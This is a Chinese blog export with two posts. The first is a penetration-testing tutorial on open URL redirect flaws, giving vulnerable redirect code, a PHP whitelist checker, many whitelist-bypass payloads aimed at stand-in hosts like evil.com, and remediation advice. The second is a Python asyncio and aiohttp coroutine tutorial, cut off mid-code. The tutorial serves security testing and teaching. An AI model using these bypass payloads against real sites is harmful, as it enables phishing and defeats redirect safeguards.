几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考） Java 1response.sendRedirect(request.getParameter("url")); PHP 12$redirect_url = $_GET['url'];header("Location: " . $redirect_url); .NET 12string redirect_url = request.QueryString[&quot;url&quot;];Response.Redirect(redirect_url); Django 12redirect_url = request.GET.get("url")HttpResponseRedirect(redirect_url) Flask 12redirect_url = request.form[&apos;url&apos;]redirect(redirect_url) Rails 1redirect_to params[:url] 网站后端对白名单限制（以PHP为例） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;?php // $allowedDomains 表示允许跳转的url白名单$allowedDomains = array( "aaaa.com" "bbbb.com" ....... );function encodeUrl($urlInfo) &#123;/*&#123;&#123;&#123;*/ $path = isset($urlInfo['path']) ? $urlInfo['path'] : ''; if(!empty($path)) &#123; $t = explode("/", $path); for($i = 0; $i &lt; count($t); $i++) &#123; $t[$i] = rawurlencode($t[$i]); &#125; $path = implode("/", $t); &#125; $query = isset($urlInfo['query']) ? $urlInfo['query'] : ''; if(!empty($query)) &#123; $t = explode("&amp;", $query); for($i = 0; $i &lt; count($t); $i++) &#123; $tt = explode("=", $t[$i]); $tt[1] = rawurlencode($tt[1]); $t[$i] = implode("=", $tt); &#125; $query = implode("&amp;", $t); &#125; if(!isset($urlInfo['host']) || empty($urlInfo['host'])) &#123; return $path. "?". $query; &#125; $scheme = isset($urlInfo['scheme']) ? $urlInfo['scheme'] : 'http'; $port = isset($urlInfo['port']) ? $urlInfo['port'] : 80; $request = $scheme . '://'. $urlInfo['host']; $request .= ($port == 80) ? '' : ':'.$port; $request .= $path; $request .= (empty($query)) ? '' : '?'.$query; return $request; &#125;/*&#125;&#125;&#125;*/ function checkUrl($url,$domainArr=array()) &#123;/*&#123;&#123;&#123;*/ $res = array('isTrustedDomain' =&gt; false,'url' =&gt; '','domain' =&gt; ''); if(empty($url)) return $res; $domainArr = empty($domainArr) || !is_array($domainArr) ? $allowedDomains : $domainArr; $url = filterUrl($url);//先过滤特殊字符 $p = parse_url($url); $scheme = $p['scheme']; if(!in_array(strtolower($scheme),array('http','https')))&#123; return $res; &#125; $host = $p['host']; if(!isValidHost($host))&#123; return $res; &#125; $hostLen = strlen($host); foreach($domainArr as $domain)&#123; $firstPos = strpos($host, $domain); if($firstPos !== false &amp;&amp; ($firstPos + strlen($domain)) == $hostLen)&#123; if($firstPos == 0 || $domain[0] == '.' || $host[$firstPos-1] == '.')&#123; $res['isTrustedDomain'] = true; $res['url'] = $url; $res['domain'] = $domain; break; &#125; &#125; &#125; return $res; &#125;/*&#125;&#125;&#125;*/ function filterUrl( $url ) &#123;/*&#123;&#123;&#123;*/ if(empty($url)) return $url; // Strip all of the Javascript in script tags out... $url = preg_replace('/&lt;SCRIPT.*?&lt;\/SCRIPT&gt;/ims',"",$url); // Strip all blank character $url = preg_replace('/[\s\v\0]+/',"",$url); //Strip special characters(',",&lt;,&gt;,\) $url = str_replace(array("'","\"","&lt;","&gt;","\\"),'',$url); return $url; &#125;/*&#125;&#125;&#125;*/ function isValidHost($host) &#123;/*&#123;&#123;&#123;*/ $p = "/^[0-9a-zA-Z\-\.]+$/"; return preg_match($p,$host) ? true : false; &#125;/*&#125;&#125;&#125;*/ $url = "https://www.baidu.com";$call_back_url = trim($url);$call_back_url = encodeUrl(parse_url(urldecode($call_back_url)));$res = checkUrl($call_back_url, $domainArr); var_dump($res); 攻击方式及危害性 恶意用户借助URL跳转构造钓鱼页面欺骗其他用户，以及获取敏感信息等，在有在线业务的站点危害较大。 借助URL跳转突破一些基于白名单的安全机制。如：传统的IM对URL的传播进行安全校验，但对于大站点的域名及URL直接允许通过并显示可信的URL，如果该URL中包含恶意跳转可能会导致安全限制被绕过。 基于白名单引用的资源，这种方式与上面的类似。比如：引入youku.com的视频，白名单中检测的时youku.com,如果包含恶意链接还是可能突破限制。 在带referer传输的站点中，就不只会产生任意URL跳转这个问题，同时可能会造成所有基于referer的安全策略失效（比较少见） 模拟跨域请求 在header头中跳转：（并没有带referer请求，所以这里只会产生任意URL及钓鱼诈骗等） 12345678910111213141516171819202122232425262728url.php&lt;?phpif (isset($_GET['url'])) &#123; $target = $_GET['url']; // 使服务端进行302跳转 header("Location: $target"); //在JavaScript中跳转 // echo "&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;"; exit;&#125; else &#123; echo "Please input the URL";&#125;?&gt; referer.php&lt;?phpif (isset($_SERVER['HTTP_REFERER'])) &#123; $referer = $_SERVER['HTTP_REFERER']; if (strpos($referer, "127.0.0.1:81")) &#123; echo "referer is true"; &#125; else &#123; echo "Wrong referer"; &#125;&#125; else &#123; echo "referer is null";&#125;?&gt; 访问：http://127.0.0.1:81/url.php?url=http://127.0.0.1:82/referer.php 在js中跳转（带referer传输，除了任意URL跳转漏洞之外还会绕过基于referer的所有安全策略） 测试方法 抓取数据包中状态码为302的URL 修改目标地址 查看是否正常跳转（如果不存在直接返回到它自己的域名，如果存在则跳转） 尝试绕过 注意点：协议一致性问题。有些网站校验跳转后的协议必须为HTTPS，有时候无法跳转并不会提示。 常见的绕过方式（利用浏览器对URL特性的支持） “@” （在Firefox中使用会有弹窗提示，其他浏览器没有） http://www.target.com/redirecturl=http://whitelist.com@evil.com “.” http://www.target.com/redirecturl=.eval.com “/” http://www.target.com/redirecturl=http://evil.com/whitelist.com http://www.target.com/redirecturl=/http://evil.com “\” http://www.target.com/redirecturl=http://evil.com\a.whitelist.com “\\” http://www.target.com/redirecturl=http://evil.com\\a.whitelist.com “\.” http://www.target.com/redirecturl=http://evil.com\.a.whitelist.com “?” http://www.target.com/redirecturl=http://evil.com?a.whitelist.com 12利用问号，这是一个特性，利用问号可以成功绕过URL限制比如：http://www.aaa.com/acb?Url=http://login.aaa.com 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：http://www.test.com/?login.aaa.com “#” http://www.target.com/redirecturl=http://evil.com#a.whitelist.com 利用白名单缺陷绕过限制 123456有些域名白名单限制不严格。1. 检测是否是当前域名http://www.aaa.com/acb?Url=http://login.aaa.com在访问后会跳转到login.aaa.com，如果它的白名单显示不严格，将login.aaa.com改成aaa.com同样可以跳转，到这里都是合法的跳转。这时只要构造一个第三方的域名中包含aaa.com的url就可以成功跳转。如果恰好有这样一个域名，恭喜你；如果没有，就需要买一个域名。emmm..在国内这样很亏2.域名字符串检测欺骗http://www.aaa.com/acb?Url=http://login.aaa.com，检测login.aaa.com，直接修改为：http://www.aaa.com/acb?Url=http://login.aaa.com.www.eval.com 利用多重验证&amp;跳转绕过限制 12现在的许多网站都有多重验证。例如：在登录账户以后会出现另一个验证，输入手机号进行验证，这时可能存在任意URL跳转的问题。具体如下：http://www.aaa.com/acb?Url=http:...http://login.aaa.com,这里只需要修改最后的URL来绕过限制 点击触发达到绕过URL跳转的限制 12在许多的登录的位置，URL是一个跳转的地址。比如：http://www.aaa.com/acb?Url=http://login.aaa.com;这个时候只要将login.aaa.com修改为任意URL;这时界面没有发生变化，当用户输入账号密码点击登录按钮时会触发跳转。需要注意的是：这里不一定要输入正确的账号密码进行跳转，有些需要，视具体的站点而定 利用xip.io绕过限制（还可以借鉴其余的SSRF绕过方法） http://www.aaa.com/acb?Url=http://login.aaa.com.eval.com.xip.io 1在SSRF读取内网地址的时候会有许多限制，有时候可以利用xip.io直接绕过限制读取，这里可以引用这个方法，直接将可以跳转的位置的地址后添加为任意url+xip.io，如果可以存在则将跳转的地址解析到后面的恶意url进行跳转。 利用超链接绕过可信站点的限制（可信站多次重定向） 1234567891011例如一个存在URL跳转漏洞的位置，在测试的时候一般都喜欢使用www.baidu.com等知名站点去做第三方跳转，但是现在像baidu.com,qq.com这样的可信站点被许多站点默认加在白名单中，所以以这样可信的站点去跳转它并不能触发URL跳转漏洞（这里是网站的正常逻辑）；而别的方式又绕不过，就可以利用下面这个思路：1. baidu.com这个域名已经被加在测试站点的白名单中2. 任意跳转的URL已经被baidu收录3. site:xxx(任意跳转的URL)4. 在百度点击相关的站点的时候回利用百度自身的一个302跳转5. 将百度自身的这个302跳转作为测试站点热任意URL的参数，绕过白名单baidu.com的限制进行任意URL跳转(注意：百度自身的302跳转太长了，可以使用单向压缩函数进行压缩，前提是测试站点能够解析)第二种场景：测试站点的白名单限制的比较严格，只允许加在自己域的地址，这时就需要一个测试站点其他域存在任意URL跳转漏洞，才可能利用成功：https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=eval.com总结：其实是利用了两次URL跳转 POST方式的URL跳转 1231. post方式下的影响较小，比如在站点的个人信息处存在头像上传，上传正常的头像，抓包将头像地址修改为恶意第三方地址，放行以后图片是不能正常显示的，这个时候如果有后台管理员的审核安全意识不高，去查看这个不显示的图片，触发恶意URL跳转，可以打到后台管理员信息。利用条件比较苛刻。在XSS也有类似的利用场景。2.如果在POST方式中数据只URL跳转参数，那就可以尝试将POST请求转换为GET请求，配合上面的绕过方式利用。（前提是测试网站支持GET传参的方式） HPP参数污染绕过 123https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=l@lsowl.xyz跳转会变成： location:http://https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=@lsowl.xyz 畸形地址绕过 畸形地址由于web站点采用各种各样的语言以及框架，所以绕过的方式显得很诡异。。。 通过添加多余的“/”(%2F),然后对%2F二次URL编码绕过网站对.com的分割 https://www.aaa.com/%2Fevil/%252Ecom 通过添加4个“/”前缀和“/..”后缀，突破限制(重复特殊字符绕过) https://www.aaa.com/redirect.php?url=////www.eval.com/.. 特殊字符： 1&quot;;&quot;, &quot;/&quot;, &quot;\&quot;, &quot;?&quot;, &quot;:&quot;, &quot;@&quot;, &quot;=&quot;, &quot;&amp;&quot;, &quot;.&quot; 协议型网站的实例 http://user:pass@testweb.com/path/;help.php?q=abc#lastpage 其他绕过思路 跳转参数是IP，而不是域名 跳转到IPV6地址，不是IPV4地址 将要跳转的IP地址用10进制，8进制，16进制表示 更换协议，使用FTP,gopher CRLF注入不能XSS时，转向利用任意URL跳转漏洞 IP地址计算补充（以本地ping百度返回的IP为例）第一种计算方法（将点分十进制转换为32位二进制）第二种计算方法111 256 256 256 + 13 256 256 + 100 256 +92*1 = 1863148636（十进制） 第三种计算方法（利用mysql中的inet_aton函数）半自动化测试 开源的payload地址：https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt 修复方案 referer限制 确定传递URL参数的引入来源，保证URL的有效性，避免恶意用户自己生成的链接(这里要注意的是，在有些特殊的环境下，URL跳转会带着HTTP referer头，这样就会使得依赖referer头验证的方式失效) 进行token验证 保证所有的链接是可信域中的，加入用户不可控的token在服务端进行验证，防止恶意跳转 服务端做好域名白名单或跳转白名单，只对合法的URL进行跳转（常用） 对请求参数做加密和签名，防止参数被篡改，服务端要能合法正确的解析URL（不常用，多应用在跳转的URL是由后台生产，不是用户在前台输入） 参考链接https://www.anquanke.com/post/id/94377 https://blog.csdn.net/change518/article/details/54286473 https://blog.csdn.net/xyx107/article/details/82941842 https://blog.csdn.net/change518/article/details/53997509 http://www.admintony.com/redict-bypass.html#more http://www.luteam.com/?p=211#more-211 [关于IP计算] http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/ [关于SSRF绕过]]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>URL跳转</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python协程学习]]></title>
    <url>%2F2018%2F11%2F09%2Fpython%E5%8D%8F%E7%A8%8B%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[python学习总结 在编写程序处理一些任务时为了提高效率，我们的程序会从单一的串行运行的方式向多线程或者多进程的方式来转变，这里学习总结通过python协程来提高程序运行的效率。多进程适合于CPU密集型的程序（各种循环处理，计数等等），多线程适合I/O密集型的程序（如文件的读取，网络爬虫等），但是由于python的GIL(全局解释器锁)的存在，I/O密集型的程序，效率并没有很大的提升，尤其是python在多CPU中多线程的应用（原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低），所以python对于I/O密集型的任务使用协程可以有效的提升效率。 相关知识总结为什么python多线程比较鸡肋 在python多线程下，每个线程的执行方式： 获取GIL 执行代码直到sleep或者是python虚拟机将其挂起 释放GIL 可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。 每次释放GIL锁，线程进行锁竞争、切换线程，会消耗资源。并且由于GIL锁存在，python里一个进程永远只能同时执行一个线程(拿到GIL的线程才能执行) 多进程是什么，为什么不会像python多线程那样 多进程就是利用 CPU 的多核优势，在同一时间并行地执行多个任务，可以大大提高执行效率。 每个进程有各自独立的GIL，互不干扰，这样就可以真正意义上的并行执行，所以在python中，多进程的执行效率优于多线程(仅仅针对多核CPU而言) python在多核CPU下做并行的效率提升，通用的就是使用多进程，可以有效的提高并行效率 什么是阻塞 阻塞状态指陈程序未得到所需要的计算资源时暂时被挂起的，程序在等待某个操作完成的期间无法进行别的操作的状态。 常见的阻塞形式有：网络 I/O 阻塞、磁盘 I/O 阻塞、用户输入阻塞等。阻塞是无处不在的，包括 CPU 切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。如果是多核 CPU 则正在执行上下文切换操作的核不可被利用。 什么是非阻塞 非阻塞状态指在程序等待某个操作的过程中自身不被阻塞，可以继续进行其他的操作。 非阻塞并不是在任何程序级别、任何情况下都可以存在的。仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。 什么是同步 不同的程序在完成某个任务，在执行过程中需要靠某种通信方式协调一致的模式 同步意味着有序 什么时异步 不同的程序在完成某个任务，在执行过程中无需通信协调完成任务，不相关的程序单元之间可以是异步的。 异步意味着无序 什么是协程 协程，英文叫做 Coroutine，又称微线程，纤程，协程是一种用户态的轻量级线程 协程自身拥有寄存器上下文和栈。协程在调度切换时，将寄存器和栈保存到其他地方，在切换上下文时恢复到原来保存的寄存器上下文和栈。协程可以保存上一次调用的状态，在每次过程的重载时就是进入了上一次调用的状态。 协程本质上是个单进程，协程相对于多进程来说，无需线程上下文切换的开销，无需原子操作锁定及同步的开销，编程模型也非常简单。结合上面来看，除去python的GIL全局解释器锁的问题，协程的上下文切换是在一个进程中不用跨进程，这种模式就决定了它的高效性。 使用协程来实现异步操作，比如在网络爬虫场景下，当一个请求发出后如果有超时的情况，这个时候就不需要一直等待，在这段时间内程序还可以处理许多任务，在请求响应以后切换回来处理，这样可以极大的提升对CPU的利用率，异步协程可以极大的提升我们处理I/O密集型任务的效率。 python异步协程的用法 python从3.4版本开始引入了协程的概念，是以生成器对象为基础，操作比较繁琐麻烦，在3.5版本引入了在 async/await，是的协程的操作更加简单。这里学习使用python协程中最常用的库 asyncio，这种协程也是基于生成器的，还有一种Gevent，Gevent需要许多第三方库支持。得确保项目中用到其他用到的网络库也必须使用纯Python或者明确说明支持Gevent，由于Gevent直接修改标准库里面大部分的阻塞式系统调用，可能会出现意想不到的问题，所以用asyncio来实现异步协程。 基本概念 event_loop：事件循环，相当于一个无限循环，我们可以把一些函数注册到这个事件循环上，当满足条件发生的时候，就会调用对应的处理方法。（这里可以理解为一个监听机制） coroutine：中文翻译叫协程，在 Python 中常指代为协程对象类型，我们可以将协程对象注册到时间循环中，它会被事件循环调用。我们可以使用 async 关键字来定义一个方法，这个方法在调用时不会立即被执行，而是返回一个协程对象。（方便开发者自己调控） task：任务，它是对协程对象的进一步封装，包含了任务的各个状态。 future：代表将来执行或没有执行的任务的结果，实际上和 task 没有本质区别 async/await 关键字，它是从 Python 3.5 才出现的，专门用于定义协程。其中，async 定义一个协程，await 用来挂起阻塞方法的执行。 定义协程 只注入简单的coroutine协程对象 1234567891011121314151617import asyncio async def execute(x): #定义一个协程,async定义的协程返回的是一个coroutine协程对象 print('Number: ',x)coroutine = execute(1)print('Coroutine: ',coroutine)print('After calling execute') loop = asyncio.get_event_loop() #创建事件循环looploop.run_until_complete(coroutine) #调用了 loop 对象的 run_until_complete() 方法将协程注册到事件循环 loop中，然后启动print('After calling loop') #运行结果：Coroutine: &lt;coroutine object execute at 0x000001C08233BEB8&gt;After calling executeNumber: 1After calling loop 将 coroutine 对象的进一步封装为task对象，它比 coroutine 对象多了运行状态，比如 running、finished 等，可以用这些状态来获取协程对象的执行情况。 123456789101112131415161718192021222324import asyncio async def execute(x): print('Number:',x) return x coroutine = execute(1)print('Coroutine:',coroutine)print('After calling execute') loop = asyncio.get_event_loop()task = loop.create_task(coroutine) #调用loop.create_task将async定义返回的coroutine对象进一步分装print('Task:',task)loop.run_until_complete(task) #调用了loop对象的run_until_complete()方法将协程注册到事件循环 loop中，然后启动print('Task:',task)print('After calling loop') #运行结果：这里可以看到task对象的状态Coroutine: &lt;coroutine object execute at 0x00000259A21EAEB8&gt;After calling executeTask: &lt;Task pending coro=&lt;execute() running at D:/python/实战项目/Coroutie2.py:3&gt;&gt;Number: 1Task: &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutie2.py:3&gt; result=1&gt;After calling loop 不借助loop的create_task方法进一步封装task对象，通过asyncio 的 ensure_future() 方法直接定义task对象 123456789101112131415161718192021222324import asyncio async def execute(x): print('Number:',x) return x coroutine = execute(1)print('Coroutine:',coroutine)print('After calling execute') task = asyncio.ensure_future(coroutine) #直接定义task对象print('Task:',task)loop = asyncio.get_event_loop()loop.run_until_complete(task)print('Task',task)print('After calling loop') #运行结果：和通过loop.create_task封装的结果一样Coroutine: &lt;coroutine object execute at 0x000002C99E56AEB8&gt;After calling executeTask: &lt;Task pending coro=&lt;execute() running at D:/python/实战项目/Coroutine3.py:3&gt;&gt;Number: 1Task &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutine3.py:3&gt; result=1&gt;After calling loop 绑定回调 通过调用 add_done_callback() 为task对象绑定一个回调方法 123456789101112131415161718192021222324import asyncioimport requests async def Request(): url = 'https://www.baidu.com' status = requests.get(url) return status def callback(task): print('Status:',task.result()) coroutine = Request()task = asyncio.ensure_future(coroutine)task.add_done_callback(callback) #绑定回调函数print('Task:',task) loop = asyncio.get_event_loop()loop.run_until_complete(task)print('Task:',task) #运行结果：Task: &lt;Task pending coro=&lt;Request() running at D:Status: &lt;Response [200]&gt;Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:4&gt; result=&lt;Response [200]&gt;&gt; 不用回调方法，直接在 task 运行完毕之后也可以直接调用 result() 方法获取结果 123456789101112131415161718192021import asyncioimport requests async def Request(): url = 'https://www.baidu.com' status = requests.get(url) return status coroutline = Request()task = asyncio.ensure_future(coroutline)print('Task:',task) loop = asyncio.get_event_loop()loop.run_until_complete(task)print('Task:',task)print('Task Result:',task.result()) #运行结果：Task: &lt;Task pending coro=&lt;Request() running at D:Status: &lt;Response [200]&gt;Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:4&gt; result=&lt;Response [200]&gt;&gt; 多任务协程（通过task列表来实现，调用asncio.wait()方法执行）123456789101112131415161718192021222324import asyncioimport requests async def Request(): url = 'https://www.baidu.com' status = requests.get(url) return status tasks = [asyncio.ensure_future(Request()) for _ in range(5)] #利用for循环创建5个taskprint('Tasks:',tasks) loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) #asyncio.wait(tasks)将task列表注入到loop循环事件中 for task in tasks: print('Task Request:',task.result()) #运行结果：Tasks: [&lt;Task pending coro=&lt;Request() running at D:/python/实战项目/Coroutine6.py:4&gt;&gt;, &lt;Task pending coro=&lt;Request() running at D:Task Request: &lt;Response [200]&gt;Task Request: &lt;Response [200]&gt;Task Request: &lt;Response [200]&gt;Task Request: &lt;Response [200]&gt;Task Request: &lt;Response [200]&gt; 协程实现 以上是对协程基本的定义使用，并没有进行异步处理的操作，这里用flask模拟网络请求有延迟的情况，然后进行挂起，异步的操作。 利用flask编写模拟有网络延迟的服务器 1234567891011from flask import Flaskimport time app = Flask(__name__)@app.route('/')def index(): time.sleep(3) #表示请求这个接口要延时3秒显示结果，模拟延迟的网络 return 'Hello!' if __name__ == '__main__': app.run(threaded = True) #threaded = True表示在服务器开启了多线程模式，如果不开启，服务端是单线程模式，如果还是异步I/O请求的方式，依旧要排队等待依次执行。 通过协程的方式来请求生成的模拟服务端页面 12345678910111213141516171819202122232425262728293031import asyncioimport requestsimport time start = time.time() async def Request(): url = 'http://127.0.0.1:5000' print('Waiting for',url) response = requests.get(url) print('Get response from ', url, 'Result: ', response.text) tasks = [asyncio.ensure_future(Request()) for _ in range(5)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) end = time.time()print('Cost time:',end - start) #运行结果：Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Cost time: 15.040287971496582 通过协程的方式请求页面发现还是在依次执行，时间为15s，效率并没有提高，原因是：协程提高效率的最大 特点是异步协程，重点是要能够异步请求，就需要程序可以将阻塞的协程挂起，让出控制权，执行其他协程。在python3.5及以后通过await实现挂起的操作，当loop循环事件遇到await是就执行协程挂起。 根据第三点的提出的特点，我们要实现挂起的是请求页面的操作，所以这里将请求页面的方法做一个修改 123456789101112131415161718192021222324252627282930import asyncioimport requestsimport time start = time.time() async def Request(): url = 'http://127.0.0.1:5000' print('Waiting for',url) response = await requests.get(url) print('Get response from ', url, 'Result: ', response.text) tasks = [asyncio.ensure_future(Request()) for _ in range(5)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) end = time.time()print('Cost time:',end - start) #运行结果：Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Cost time: 15.033875942230225Traceback (most recent call last): File "D:/python/实战项目/Coroutine8.py", line 10, in Request response = await requests.get(url)TypeError: object Response can't be used in 'await' expression 通过运行结果来看，不能这样修改，Waiting for http这里确实是挂起了，但是await后面的对象不对，因为await后面必须跟一个原生 coroutine 对象或者一个由 types.coroutine() 修饰的生成器，这个生成器可以返回 coroutine 对象，而requests.get的生成的对象是：，所以不符合 所以考虑将请求页面的方法单独封装，实现生成coroutine 对象 123456789101112131415161718192021222324252627282930313233import asyncioimport requestsimport time start = time.time() async def get(url): return requests.get(url)async def Request(): url = 'http://127.0.0.1:5000' print('Waiting for',url) response = await get(url) print('Get response from ', url, 'Result: ', response.text) tasks = [asyncio.ensure_future(Request()) for _ in range(5)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) end = time.time()print('Cost time:',end - start) #运行结果：Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Cost time: 15.035670042037964 通过运行结果来看，将I/O操作的代码封装到 async 修饰的方法里面是不可行，无法实现异步请求，所以必须使用支持异步请求的方法来实现，这里使用aiohttp(时间缩短为原来的1/5，效率大大提高) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#不要为每次的连接都创建一次session,一般情况下只需要创建一个session，然后使用这个session执行所有的请求。#每个session对象，内部包含了一个连接池，并且将会保持连接和连接复用（默认开启）可以加快整体的性能。import asyncioimport aiohttpimport time start = time.time() async def get(url): session = aiohttp.ClientSession() response = await session.get(url) result = await response.text() await session.close() #这里的await是必须的，因为session的请求会话出现了可挂起的选项，如果close不可以挂起，会出现阻塞的状态导致报错 return result async def request(): url = 'http://127.0.0.1:5000' print('Waiting for',url) result = await get(url) print('Get response from',url,'Result:',result) tasks = [asyncio.ensure_future(request()) for _ in range(5)] loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(tasks)) end = time.time() print('Cost time:',end - start)# 运行结果： Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Cost time: 3.0310966968536377# 修改await session.close()为session.close()的报错执行结果 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Cost time: 3.012549638748169 D:/python/Conoutine10.py:12: RuntimeWarning: coroutine 'ClientSession.close' was never session.close() Unclosed client session client_session: &lt;aiohttp.client.ClientSession object at 0x0000022C36EC9D68&gt; Unclosed client session client_session: &lt;aiohttp.client.ClientSession object at 0x0000022C36EC9EF0&gt; Unclosed client session client_session: &lt;aiohttp.client.ClientSession object at 0x0000022C36EC9F28&gt; Unclosed client session client_session: &lt;aiohttp.client.ClientSession object at 0x0000022C36EC9F98&gt; Unclosed client session client_session: &lt;aiohttp.client.ClientSession object at 0x0000022C36EC9F60&gt; 通过几次代码的修改，我们成功的实现了真正的异步协程。开始运行时，时间循环会运行第一个 task，针对第一个 task 来说，当执行到第一个 await 跟着的 get() 方法时，它被挂起，但这个 get() 方法第一步的执行是非阻塞的，挂起之后立马被唤醒，所以立即又进入执行，创建了 ClientSession 对象，接着遇到了第二个 await，调用了 session.get() 请求方法，然后就被挂起了，由于请求需要耗时很久，所以一直没有被唤醒，好第一个 task 被挂起了，那接下来该怎么办呢？事件循环会寻找当前未被挂起的协程继续执行，于是就转而执行第二个 task 了，也是一样的流程操作，直到执行了第五个 task 的 session.get() 方法之后，全部的 task 都被挂起了。所有 task 都已经处于挂起状态，那咋办？只好等待了。3 秒之后，几个请求几乎同时都有了响应，然后几个 task 也被唤醒接着执行，输出请求结果，最后耗时，3 秒！这里对应这我们模拟服务端设置的延时3秒。 根据上面显示的结果来看，5个task在3s之内都是挂起的等待的，同理，在3s之内CPU处理的task数量肯定会比5个（取决于CPU，我这里改成1000就会报错）；所以就意味着在CPU允许的范围之内处理多少task的时间都是3s（前提是服务段抗压性好，能正确对每次请求做出正确的返回）。将5改为300来测试：task数量提高了60倍，处理时间还是3s，可以看到协程的优点；多出来的部分时间是IO 传输时延 12345678910111213141516171819202122232425262728import asyncioimport aiohttpimport timestart = time.time()async def get(url): session = aiohttp.ClientSession() response = await session.get(url) result = await response.text() await session.close() return resultasync def request(): url = 'http://127.0.0.1:5000' print('Waiting for',url) result = await get(url) print('Get response from',url,'Result:',result)tasks = [asyncio.ensure_future(request()) for _ in range(300)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))end = time.time()print('Cost time:',end - start) 与单进程、多进程、多线程的对比 单进程，单线程：(以10次请求为例) 123456789101112131415161718192021222324252627282930313233343536import requestsimport time start = time.time()def Request(): url = 'http://127.0.0.1:5000' print('Waiting for',url) result = requests.get(url).text print('Get response from',url,'Result:',result)for _ in range(10): Request()end = time.time()print('Cost time:',end - start)# 运行结果： Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Cost time: 30.057233095169067 多进程(以10次请求为例) 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requests import time import multiprocessing start = time.time() def Request(_): url = 'http://127.0.0.1:5000' print('Waiting for',url) result = requests.get(url).text print('Get response from',url,'Result:',result) if __name__ == '__main__': cpu_count = 